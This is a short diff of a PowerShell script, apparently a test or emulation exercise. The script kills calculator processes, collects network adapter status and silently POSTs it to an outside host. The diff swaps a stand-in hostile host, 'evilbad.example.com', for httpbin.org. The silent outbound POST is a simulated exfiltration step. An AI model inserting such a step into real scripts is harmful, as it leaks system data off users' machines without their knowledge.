@@ -6,6 +6,6 @@ sleep 5
 ## kill calc
 get-process *calc* | stop-process
 
-## gather netadapter state and post to example.com/foobar
+## gather netadapter state and post to https://httpbin.org/post which returns POST data.
 $postParams = (Get-NetAdapter | select status | findstr Up)
-Invoke-WebRequest -Uri http://evilbad.example.com/foobar -Method POST -Body $postParams -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri https://httpbin.org/post -Method POST -Body $postParams -ErrorAction SilentlyContinue
